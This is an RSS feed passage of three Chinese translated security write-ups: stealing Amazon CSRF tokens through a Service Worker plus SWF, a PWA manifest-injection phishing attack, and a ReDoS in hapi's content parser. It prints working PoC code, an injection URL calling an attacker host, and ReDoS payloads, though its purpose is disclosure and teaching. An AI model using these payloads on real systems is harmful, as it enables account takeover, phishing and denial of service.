href=&quot;https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f&quot;&gt;https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-24-30401930</guid>
<pubDate>Tue, 24 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>使用 Service Worker API窃取 Amazon 的CSRF Tokens</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-17-30214540.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;使用 Service Worker API窃取 Amazon 的CSRF Tokens&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30214540&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大家好，今天我有空闲时间，我想给你们分享我在 Amazon 的发现，这个问题可能会导致你的的 Amazon 帐户被完全控制。&lt;/p&gt;&lt;h2&gt;介绍&lt;/h2&gt;&lt;p&gt;首先,让我们来简单谈谈 Amazon ——世界最大的电子商业门户(电子商业即意味着大量资产的聚集），他拥有远超于34万的雇员。如此庞大的工作人群就导致网站面临十分严峻的安全问题，于是 Amazon 创建了一个网站来供用户反馈安全问题（对提交者没有任何奖赏），这也就是我今天漫长故事的缘由——它会报告安全问题给安全团队来修复，使产品更加安全，但是提交者却什么也得不到，甚至没有一点声望奖励，比如设置名人堂或者哪怕是一件文化衬衫。&lt;br&gt;&lt;/p&gt;&lt;p&gt;近些天来我没有花很多时间去寻找漏洞，但是当我发现漏洞时，我会将所有时间和精力都投入进去，确保构造一个完美的 &lt;b&gt;PoC&lt;/b&gt; (Proof of Concept 观点验证程序，通过执行程序来达到预期的结果)去书写报告，这不是一个策略性的攻击，而是一个很好的服务器端漏洞。&lt;br&gt;&lt;/p&gt;&lt;p&gt;当我发现下面这个有趣的漏洞的时候，我正忙于私人漏洞悬赏项目。悬赏方使用了名为 Answerhub 的第三方服务，如果你在之前看过我的blog，你就会发现我已经在这个服务上发现过漏洞，所以不可能找不到新漏洞。因为我已经找到我以前的发现，你可以在这里阅读 &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/how-i-hacked-oculus-oauth-ebay-ibm/&quot;&gt;How&lt;/a&gt; &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/how-i-hacked-oculus-oauth-ebay-ibm/&quot;&gt;I&lt;/a&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/how-i-hacked-oculus-oauth-ebay-ibm/&quot;&gt;Hacked Oculus OAuth +Ebay +IBM&lt;/a&gt;。于是,我开始在上传功能方面寻找突破。&lt;br&gt;&lt;/p&gt;&lt;p&gt;我很清楚我需要的是什么，所以没有花太多时间在没有用的东西上。在漏洞报告中，我直接使用文件上传来创建存储型的XSS。这个域名本身是超范围（指这个域名不在 FaceBook的漏洞奖励域名范围内)的,但是我构造了JS攻击代码,完成了对另外一个在范围内域名的攻击，为此，他们给了我1250美元的报酬。&lt;br&gt;&lt;/p&gt;&lt;p&gt;同时，我发现亚马逊也在使用相同的第三方服务（AnswerHub），鉴于 amazon crossdomain.xml策略的宽松，我衍生了一个想法，如果我能找到一种方式来上传SWF文件到amazon子域，我就可以从主域窃取数据。不过它不允许上传flash内容。现在我们开始有趣的部分，结束无聊的介绍。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;技术细节&lt;/h2&gt;&lt;p&gt;这一小节的标题很吸引人，你们许多人会为了仅仅了解这样一种方法选择跳至此段，而并不是对我所讲述的故事感兴趣。那么你们今天相当幸运，我会把你们所想知道的一切告诉你们。&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，寻找一些正在使用 AnswerHub 服务的大公司&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过使用 Google dork 搜索语法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;inurl：/questions/ask.html 
inurl：https：//
&lt;/code&gt;&lt;p&gt;我得到了很多满意的结果，经过一些筛选。当我看到 Amazon的字样后，查看crossdomain.xml 的想法立马从我脑袋里就跳了出来，那么就让我们来尝试一下。&lt;/p&gt;&lt;p&gt;这是 Amazon的 crossdomain.xml：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a2fec87a2dbfdd85d1d102bc1262acf2_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;592&quot; data-rawheight=&quot;502&quot;&gt;&lt;p&gt;我的目标是 &lt;a href=&quot;http://link.zhihu.com/?target=http%3A//gamedev.amazon.com&quot;&gt;http://gamedev.amazon.com&lt;/a&gt;，我能够上传 XML文件( SVG)，这可能造成存储型 XSS，但这不是我想要的,所以我尝试了所有我知道的技巧来上传 SWF文件，但都无济于事&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Thinking outside the box&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我没有发现 swf 上传有任何问题 , 我一直在思考 我已经有的 XSS漏洞。然后我想到了一个好主意，通过同时上传 SVG文件和 JS文件来触发这个域上的 Service Worker！&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Service Worker API（Google Chrome）&lt;/b&gt;：&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;A service worker is a&lt;br&gt;script that your browser runs in the background, separate from a web page,&lt;br&gt;opening the door to features that don’t need a web page or user interaction.&lt;br&gt;Today, they already include features like push notifications and background&lt;br&gt;sync. In the future, service workers will support other things like periodic&lt;br&gt;sync or geofencing. The core feature discussed in this tutorial is the ability&lt;br&gt;to intercept and handle network requests, including programmatically managing a&lt;br&gt;cache of responses.&lt;/i&gt;&lt;/blockquote&gt;&lt;p&gt;( Service Worker是一种浏览器在后台运行的脚本，与网页分开，为不需要的网页和用户交互的功能打开了大门。它的核心功能是拦截和处理网络请求的能力，包括以编程方式管理响应缓存。如今，他们已经包括推送通知和后台同步等功能。并且在未来，Service Worker也将支持周期性同步或地理围栏等其他任务。)&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;The reason this is such an exciting API is that it&lt;br&gt;allows you to support offline experiences, giving developers complete control&lt;br&gt;over the experience.&lt;/i&gt;&lt;/blockquote&gt;&lt;p&gt;(更令人激动的是它对离线功能的支持，以及开发者完全控制的能力。)&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在让我简单地描述这个攻击的原理和每个文件的代码：&lt;/p&gt;&lt;p&gt;&lt;b&gt;1&lt;/b&gt; 写一段 AS( ActionScript) 代码向 &lt;a href=&quot;http://link.zhihu.com/?target=http%3A//amazon.com&quot;&gt;http://amazon.com&lt;/a&gt;发送一个 HTTPS请求，并接收响应内容 在响应内容页面中寻找 CSRF Token,代码如下:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;import flash.external.*;
import flash.net.*;

(function
() {
Var loader = newURLLoader(newURLRequest(&quot;https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/&quot;));

  loader.addEventListener(&quot;complete&quot;, loaderCompleted);

  function loaderCompleted(event) {

  ExternalInterface.call(&quot;alert&quot;,
event.target.data.slice(189270,189335));
}
})();
&lt;/code&gt;&lt;p&gt;这个脚本文件放到了我的网站( &lt;a href=&quot;http://link.zhihu.com/?target=http%3A//ahussam.me&quot;&gt;http://ahussam.me&lt;/a&gt;)上，名字为 myexp.as 后面会用到,同时使用 flex SDK 来生成对应版本的SWF代码，我还创建了一个 PHP 脚本来生成来自 AS 代码的 SWF 文件，我将很快在我的 Github 帐户中发布。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;2&lt;/b&gt; JS文件将被注册成网站的 Service Worker，使我能够代理流量并在此路径上创建 SWF文件响应。下面是JS代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;var url =&quot;https://ahussam.me/myexp.swf&quot;
onfetch =(e)=&amp;gt; {
 e.respondWith(fetch(URL);
}&lt;/code&gt;&lt;p&gt;在 crossdomain.xml的帮助下，这些代码可以在这个路径上安装作为 Service Worker的 SWF文件（myexp.swf）并对主站的 CSRF tokens进行抓取)&lt;br&gt;&lt;/p&gt;&lt;p&gt;我先上传它，得到一个新的文件名(文件名在上传后会更改)。然后重命名为sw.txt，来通过附件的检测。在这里我改变了内容类型。上传后，文件名成为4837-sw.txt。&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是 HTTP请求：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2c5be871709afe98fbfe0c043125ece1_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1366&quot; data-rawheight=&quot;768&quot;&gt;&lt;p&gt;&lt;b&gt;3&lt;/b&gt; HTML页面会为这个 SVG文件包含 xml和 JS的 Service Worker注册。&lt;/p&gt;&lt;p&gt;下面是 JS代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if（&#39;serviceWorker&#39;in navigator）{
//
4837-sw.txt is the previous file.
navigator.serviceWorker.register（
&#39;4837-sw.txt&#39;）.then（_ =&amp;gt;location= 1337）;
}
&lt;/code&gt;&lt;p&gt;像之前一样，我改变了文件扩展名和内容类型&lt;/p&gt;&lt;p&gt;这里是 HTTP请求：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-355215ae6b139a8b17a04e9c16c9baa8_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1366&quot; data-rawheight=&quot;768&quot;&gt;&lt;p&gt;这是我的 PoC地址：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://gamedev.amazon.com/forums/storage/attachments/4937-svg.txt&lt;/code&gt;&lt;p&gt;这个利用第一次没有成功（因为我使用HTTP协议,而Service Worker也仅在HTTPS中可行，如果没有SWF文件的https网站，则可以在fetch函数中使用data-URI和base64编码），我也是经过了一番调试才成功的！&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d268cf821dd36f2b2dcac21c20541d91_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;442&quot; data-rawheight=&quot;155&quot;&gt;&lt;p&gt;随后，我向亚马逊团队发送了 PoC。由于报告的篇幅长度，他们没有仔细查看内容并引起相关重视。Gamedev 团队删除了我的 PoC 打消了我再发报告的念头！&lt;br&gt;&lt;/p&gt;&lt;p&gt;于是我做了一个视频来简洁展示 PoC 报告内容。但是他们无法马上观看。于是我重新上传，再现此漏洞的验证过程。&lt;br&gt;&lt;/p&gt;&lt;p&gt;经过几个月的等待，他们没有回复我的消息，但是不久后就发现这个bug已经修复了。于是我发送了一封很长的信告诉他们，我对他们处理安全报告的方式感到十分不满。相比系统自动回复的消息，我(以及每个花费时间的去使网络环境更好的人)更想得到相应的的回报，而不是安全团队的一句简单&quot;谢谢!&quot;。&lt;/p&gt;&lt;p&gt;一段时间后我收到了下面这条消息：&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;Hi Abdullah,&lt;/i&gt; &lt;i&gt;I apologise for&lt;br&gt;the delay in getting back to you and the lack of confirmation whether this&lt;br&gt;issue was fixed. It has been addressed by the service team; I would like to&lt;br&gt;pass along their thanks, as well as my own, for discovering this issue.&lt;/i&gt; &lt;i&gt;Presently, we&lt;br&gt;do not participate in a bug bounty program or offer rewards for security&lt;br&gt;research. However, I understand your desire for a more dynamic and immediate&lt;br&gt;reward system for reported security concerns. We will incorporate this feedback&lt;br&gt;as we continue to improve our security issue response process.&lt;/i&gt; &lt;i&gt;We look forward&lt;br&gt;to hearing more from you and working together to protect AWS customers. Thank&lt;br&gt;you for your time, consideration, and sharing our passion for security.&lt;/i&gt; &lt;i&gt;Best RegardsXXXXXXX XXX.&lt;/i&gt; &lt;i&gt;AWS Security&lt;/i&gt; &lt;i&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//aws.amazon.com/security&quot;&gt;https://aws.amazon.com/security&lt;/a&gt;&lt;/i&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;(你好 &lt;i&gt;Abdullah&lt;/i&gt;，&lt;br&gt;对于延迟回复您此问题是否得到修复，我们深表歉意。服务团队已经解决了这个问题。我和整个服务团队都很感激您发现了这个问题。&lt;br&gt;目前，我们还没有漏洞奖励计划来为安全研究提供奖励。我了解到您希望我们为报告的安全性问题提供更加灵活和及时的奖励制度，我们也将纳入您的这些反馈意见，在我们继续改进我们的安全问题响应的过程中。 &lt;br&gt;我们期待着来自您的更多建议和发现，并能和我们共同合作，保护AWS客户。感谢您的花费的时间，对用户安全的考虑和分享您的发现以及我们对安全的热情。&lt;br&gt;最好的祝福&lt;br&gt;XXXXXXX XXX。&lt;br&gt;AWS安全&lt;br&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//aws.amazon.com/security&quot;&gt;https://aws.amazon.com/security&lt;/a&gt;)&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;由于我能够窃取CSRF Tokens，所以有一种方法来改变用户的电话号码，这可能导致完全帐户接管。更多的攻击不仅可以做到CSRF，而且可能会造成信息泄露，Oauth认证，地址披露等问题。&lt;/p&gt;&lt;p&gt;我希望你们喜欢我的文章，并能学到一些东西。谢谢你们的阅读。&lt;/p&gt;&lt;p&gt;也许我应该在这里提到。这种方法已被用于 Cure53 XSSmas的挑战，不一样但非常接近。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;参考：&lt;/b&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/Amazon-leaking-csrf-token-using-service-worker/&quot;&gt;Leaking Amazon.com CSRF Tokens Using Service Worker API&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-17-30214540</guid>
<pubDate>Tue, 17 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>PWA-Progressive Web Attack</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-11-30036967.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;PWA-Progressive Web Attack&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30036967&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今天，我将要讲述的是有关 PWA(Progressive Web Apps，即网页版App)的相关内容.&lt;/p&gt;&lt;p&gt;近些日子以来，随着 CSP（内容安全策略）的运用和帮助，缓解了很大一部分潜在的跨站脚本问题，网站通过 CSP将 XSS(跨站脚本攻击)转换成 HTML注入，安全性能得到提升。有时甚至在面对存在 XSS漏洞的却没有使用CSP的现代网页时，我们也可能感到束手无策。&lt;/p&gt;&lt;p&gt;但是，假如出现了一种可以仅通过 HTML注入，就可以在浏览器管理系统原生界面安装APP的方式呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Progressive Web Apps&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;PWA是一种拥有响应用户和离线功能（运用 Service Worker，Cache API等）的网页应用程序，这也就意味着它和原生应用程序非常地接近。&lt;/p&gt;&lt;p&gt;但是，请想一想，我们能够通过 Application Cache来实现它吗？答案是肯定的，因为 PWA是可以在 Web APP Manifest的运用下实现安装的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Progressive Web Attack&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Web App Manifest很特殊，它具备在浏览器管理原生界面中触发 PWA安装提示的功能。使用一个指向符合跨域（任何类型）的 Manifest文件链接标签就可以轻易实现。&lt;/p&gt;&lt;p&gt;那么让我们来看看该如何利用这个特性？&lt;/p&gt;&lt;p&gt;假设受害站点具备离线功能并且检测出在 Service Worker服务范围的网页中存在 XSS漏洞，但是却在该站点中使用了相当严格的 CSP。&lt;/p&gt;&lt;p&gt;Victim site：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/&lt;/code&gt;&lt;p&gt;Vulnerable page：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=Guest&lt;/code&gt;&lt;p&gt;And here is how to trigger installation prompt.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=%3C/title%3E%3Clink%20rel=manifest%20href=//attack.shhnjk.com/manifest.txt%3E%3C/head%3E%3Cbody%3E%3Ch1%3EHey!%20Try%20our%20New%20App!%3C!--&lt;/code&gt;&lt;p&gt;首先，确定进入了主页面来保证 Servive Worker已注册,然后接下来，使用 Andriod系统的Chrome浏览器进入上述的网址，你会看到下面的情况：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8f6ecb47707fa4a8186b7fe6579a7bc4_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;323&quot; data-rawheight=&quot;505&quot;&gt;&lt;p&gt;点击 “Add”（不好意思，我的手机默认语言为日语，即上图“追加”）按钮时会开启下载内容并在手机的桌面创建图标，当你打开这个 App，你就会看到下面的页面：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=%3C/title%3E%3C/head%3E%3Cbody%3E%3Ciframe%20frameBorder=%220%22%20width=%22100%%22%20height=%22100%%22%20src=%22//attack.shhnjk.com/success.html%22%3E&lt;/code&gt;&lt;p&gt;该页面是框架攻击者设置的页面.由于 app的起始页面受到了攻击者的 manifest文件的控制并且只具有攻击者提供的导航功能（没有地址栏，后退或者转发的按钮），使用者将完全陷入攻击者的控制当中。和原始受害站点告别，用户将从现在起陷入攻击！&lt;/p&gt;&lt;p&gt;这一切都仅仅是在 HTML注入的方式下实现的。&lt;/p&gt;&lt;p&gt;顺便说一句，我认为浏览器提供的安装提示不是很安全，它在提示给用户时只会显示顶层域，因此任何允许将用户内容上传到子域的网站（例如 Shopify）就可被用于钓鱼攻击。&lt;/p&gt;&lt;p&gt;无论如何，以下有几点是该项技术的限制：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;指向 manifest文件的 link标签需要包含在head标签内。&lt;/li&gt;&lt;li&gt;start_url需要与受害站点同源。&lt;/li&gt;&lt;li&gt;即使在 app内部，将顶级文档导航到跨原始站点也将触发地址栏,甚至在应用程序中的显示。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;最后一点，我认为 manifest文件仅仅应该在符合同源的情况下被接受，规格也需要得到更加仔细的思考（希望能够得到改变）&lt;/p&gt;&lt;p&gt;为了防止这种类型的攻击，请确保使用安全的下载源或在不使用 PWA(和 AppCache)的情况下将 CSP中的 manifest-src设置为“none”。 &lt;/p&gt;&lt;p&gt;希望你们能够喜欢我的分享。&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-11-30036967</guid>
<pubDate>Wed, 11 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>基于正则表达式的 DDoS 及实例讲解</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-07-29920988.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;基于正则表达式的 DDoS 及实例讲解&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29920988&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在之前的&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28424183&quot;&gt;文章&lt;/a&gt;中，我们讲解过基于hash的 DoS 攻击。这篇文章中，我们将带来基于正则表达式类型的（Regular Expression）拒绝服务攻击的讲解。最后，我们用 hapi 框架的一个漏洞作为实例解析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 ReDoS？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当一个正则表达式包含了冗余的匹配，那么它就极有可能引发 ReDoS（即:基于正则表达式的拒绝服务攻击）。由于过多的匹配，正则引擎的匹配速度会飞速下滑。就拿 &lt;b&gt;(a+)+ &lt;/b&gt;来说，当我们输入 &lt;b&gt;aa &lt;/b&gt;时，正则引擎会匹配成 &lt;b&gt;(a)(a)&lt;/b&gt; 或者&lt;b&gt; (aa)&lt;/b&gt;。如果我们输入了 &lt;b&gt;aaa&lt;/b&gt;，正则引擎就会查询&lt;b&gt;(aaa)&lt;/b&gt;，&lt;b&gt;(aa)(a)&lt;/b&gt;，&lt;b&gt;(a)(aa)&lt;/b&gt;，甚至是 &lt;b&gt;(a)(a)(a)&lt;/b&gt;。很明显，我们每多输入一个字母 &lt;b&gt;a&lt;/b&gt;，匹配的数量就要乘以2。不过有一点需要注意，我们最终传递进去的字符最终需要被匹配&lt;b&gt;&lt;i&gt;失败&lt;/i&gt;&lt;/b&gt; ，否则短路效应会直接结束匹配并返回结果，反之则会一直枚举可能的情况。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;寻找问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了基本知识，让我们来实际操作一下。一个正则表达式如下（最新版本已被修复）：&lt;/p&gt;&lt;code lang=&quot;python3&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看上去很棘手，不过只要问题的核心是冗余的表达式，我们就一定能发现漏洞。我们从头开始，第一个可疑处是 &lt;b&gt;\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)&lt;/b&gt;（排除多余的部分后，我们可以简化其为 &lt;b&gt;\s*[^;&#39;]+&lt;/b&gt;）。用自然语言来描述，大概意思就是找到跟随任意数量空格的非冒号或单引号的一个或多个字符。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在这个 &lt;a href=&quot;https://github.com/hapijs/content&quot;&gt;repo&lt;/a&gt; 中，我们可以得知这个表达式是 content 库用来解析 &lt;b&gt;Content-Dposistion &lt;/b&gt;头中的参数。一个合法的 &lt;b&gt;Content-Dposistion &lt;/b&gt;看上去像：&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition:form-data; name=&quot;content&quot;;filename=&quot;hello.txt&quot;&lt;/b&gt;。为了确认这一点，我们来用这个模块解析一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const Content = require(&#39;content&#39;);
const header = &#39;form-data; name=&quot;content&quot;; filename=&quot;hello.txt&quot;&#39;;
console.time(&#39;parse&#39;);
console.log(Content.disposition(header));
console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如果你安装了 &lt;a href=&quot;mailto:%60content@3.0.5%60&quot;&gt;content@3.0.5&lt;/a&gt; 或之前的版本，你会得到这个：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{ name: &#39;content&#39;, filename: &#39;hello.txt&#39; }
parse: 6.200ms
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们已知可以利用空格，并且构造的payload必须被匹配失败，那么应该如何写出PoC呢？答案很简单，先传入非空格字符，再在后面附加上尽可能多的空格。我们来做个500字的测试：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Content = require(&#39;content&#39;);
const
header = &#39;form-data; x&#39; + new Array(500).join(&#39; &#39;);

console.time(&#39;parse&#39;);
console.log(Content.disposition(header));
console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是输出：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{
Error: Invalid content-disposition header format includes invalid parameters /*
snip */ }
parse:
47.440ms&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;解析速度比原来慢了接近8倍，但总的来说还不算严重。当空格为1000时，解析则花了292ms，当我们再加多1000个空格后，解析器花了2387ms 执行。问题很明显了，不过我们依然不清楚它会有多严重的影响。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;利用content攻击hapi&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition &lt;/b&gt;一般用来告诉客户端响应主体是内联的还是一个附件，有时也用来提供关于multipart form（多重表单）的元数据信息。由于第一个（用途）往往为服务器发出，我们就需要找出使用该框架解析 &lt;b&gt;Content-Disposition &lt;/b&gt;的客户端，而这十分罕见，所以我们不做讨论。不过第二种情况则屡见不鲜，让我们一起研究一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于hapi使用content，我们就可以用它攻击hapi服务器。首先，我们得模拟接收表单（复现需要&lt;a href=&quot;mailto:hapi@16.5.2&quot;&gt;hapi@16.5.2&lt;/a&gt;及以下的版本）：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Hapi = require(&#39;hapi&#39;);
const
server = new Hapi.Server();

server.connection({
port: 8080 });
server.route({
method: &#39;post&#39;,
path: &#39;/&#39;,
handler: function (request, reply) {
return reply();
}
});

server.start(()
=&amp;gt; {
console.log(&#39;started&#39;);
});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在我们可以开始构造PoC了：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Wreck = require(&#39;wreck&#39;);

const
payload = [
&#39;--123456&#39;,
&#39;content-disposition: form-data; x&#39; + new
Array(2000).join(&#39; &#39;),
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456&#39;,
&#39;content-disposition: form-data;
name=&quot;field2&quot;&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456--&#39;
].join(&#39;\r\n&#39;);

console.time(&#39;req&#39;);
Wreck.post(&#39;http://localhost:8080&#39;,
{ headers: { &#39;content-type&#39;: &#39;multipart/form-data; boundary=123456&#39;,
&#39;content-length&#39;: Buffer.byteLength(payload) }, payload }, (err, res, body)
=&amp;gt; {
console.timeEnd(&#39;req&#39;);
});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这一段代码跑了 46ms。似乎没有想象中这么慢，让我们看看哪里出来问题。翻了一段又一段的执行链，我们发现 hapi 使用 &lt;a href=&quot;https://github.com/hapijs/subtext&quot;&gt;subtext&lt;/a&gt; 中的 &lt;a href=&quot;https://github.com/hapijs/pez&quot;&gt;pez&lt;/a&gt; 解析payload。pez 会截断一个 header 的结束与另一个 header 的开头之间额外的空格，所以我们需要在空格结尾添加一个字符（用来表示该 header 还没结束）防止空格被移除：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;const payload = [
&#39;--123456&#39;,
&#39;content-disposition: form-data; x&#39; + new
Array(2000).join(&#39; &#39;) + &#39;x&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456&#39;,
&#39;content-disposition: form-data;
name=&quot;field2&quot;&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456--&#39;
].join(&#39;\r\n&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个 PoC 则执行了2000多ms，大功告成了！不过我们应该如何修复呢？&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;正确的解析方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前一个式子是因为空格的冗余匹配而导致的，因此，我们只需要在匹配字符时将空格也纳入黑名单即可：&lt;b&gt;\s*[^;&#39;\s]+&lt;/b&gt;，我们先来试试这种简单粗暴的改法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;再运行一次 PoC，结果还是跑了两千多毫秒。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在该表达式开头处，你会看到 &lt;b&gt;[^\=\*]+\s*&lt;/b&gt;。因此，我们还需修正此处：&lt;/p&gt;&lt;code 